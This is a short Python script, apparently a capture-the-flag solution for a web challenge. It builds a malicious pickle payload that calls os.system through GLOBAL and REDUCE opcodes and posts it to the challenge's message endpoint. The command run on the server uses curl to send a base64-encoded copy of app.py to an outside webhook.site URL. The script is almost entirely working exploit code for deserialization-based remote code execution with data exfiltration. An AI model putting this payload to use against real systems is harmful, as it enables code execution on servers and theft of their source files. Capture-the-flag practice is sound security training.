from pickle import *
from io import BytesIO
from os import urandom
from flask import Flask, request, render_template
import __main__

def solve():
    p =  b''
    p += b'hack\n'
    p += UNICODE + b'username\n'
    p += GLOBAL + b'os\nsystem\n'
    p += MARK
    p += UNICODE + b'curl -X GET https://webhook.site/b4186eb1-c349-41e9-ab17-66306fe267d3/$(cat app.py | base64 -w 0)\n'
    p += TUPLE + REDUCE
    p += UNICODE + b'nonsense\n' + UNICODE + b'nonsense'

    username = 'rawr'
    creds = MARK
    creds += UNICODE + b'username\n' + UNICODE + username.encode() + b'\n'
    creds += UNICODE + b'password\n' + UNICODE + p + b'\n'
    creds += DICT
    creds += STOP

    import requests
    url = 'https://web-heat-abnormal.finals.blahaj.sg/message'

    data = {'username': username, 'message': p.decode()}
    with requests.Session() as s:
        print(data)
        resp = s.post(url, data=data, verify=False)

if __name__ == "__main__":
    solve()
